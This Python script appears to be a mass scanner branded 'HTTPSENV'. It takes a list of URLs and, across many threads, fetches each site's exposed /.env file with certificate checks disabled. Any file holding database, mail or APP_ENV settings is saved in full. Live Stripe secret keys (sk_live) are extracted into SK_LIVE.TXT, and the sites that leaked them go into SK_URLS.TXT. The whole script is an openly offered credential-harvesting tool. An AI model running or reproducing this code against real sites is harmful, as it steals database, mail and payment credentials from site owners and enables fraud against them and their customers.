import re
import sys
import os
import time
import socket
import urllib3
import smtplib
import os.path
import requests
from os import path
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'
    
class ENV :
   def scan (self, url):
      rr = ''
      proto =''
      mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=','sk_live', 'APP_ENV=']
      try:
         r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
         if r.status_code ==200:
            resp = r.text
            if any(key in resp for key in mch):
               rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
               with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                  output.write(f'{resp}\n')
               if "sk_live" in resp:
                  file_object = open('SK_URLS.TXT', 'a')
                  file_object.write(f'URL : https://{url}\n')
                  file_object.close()
               lin = resp.splitlines( )
               for x in lin:
                  if "sk_live" in x:
                     file_object = open('SK_LIVE.TXT', 'a')
                     file_object.write(re.sub(".*sk_live","sk_live",x).replace ("\"","")+'\n')
                     file_object.close()
            else :
               rr = f'{xcol.LXC}[ENV] :{xcol.RESET} https://{url}'
         else :
            rr = f'{xcol.LXC}[ENV] :{xcol.RESET} https://{url}'
      except :
         rr = f'{xcol.LRED}[EXC] :{xcol.RESET} https://{url}'
      print(rr+'/.env')
if __name__ == '__main__':
   os.system('clear')
   print(""" \033[38;2;158;158;158m
██╗  ██╗████████╗████████╗██████╗ ███████╗███████╗███╗   ██╗██╗   ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝████╗  ██║██║   ██║
███████║   ██║      ██║   ██████╔╝███████╗█████╗  ██╔██╗ ██║██║   ██║
██╔══██║   ██║      ██║   ██╔═══╝ ╚════██║██╔══╝  ██║╚██╗██║╚██╗ ██╔╝
██║  ██║   ██║      ██║   ██║     ███████║███████╗██║ ╚████║ ╚████╔╝ 
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚═══╝  
                                                                     
  \u001B[0m
  """)

   if not os.path.isdir("ENVS"):
      os.makedirs("ENVS")
   threads = []
   while(True):
      try:
         thrd = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
         break
      except:
         pass
   while(True):
      try:
         inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
         with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
         break
      except:
         pass
   with ThreadPoolExecutor(max_workers=thrd) as executor:
      for data in argFile:
         threads.append(executor.submit(ENV().scan, data))
   quit()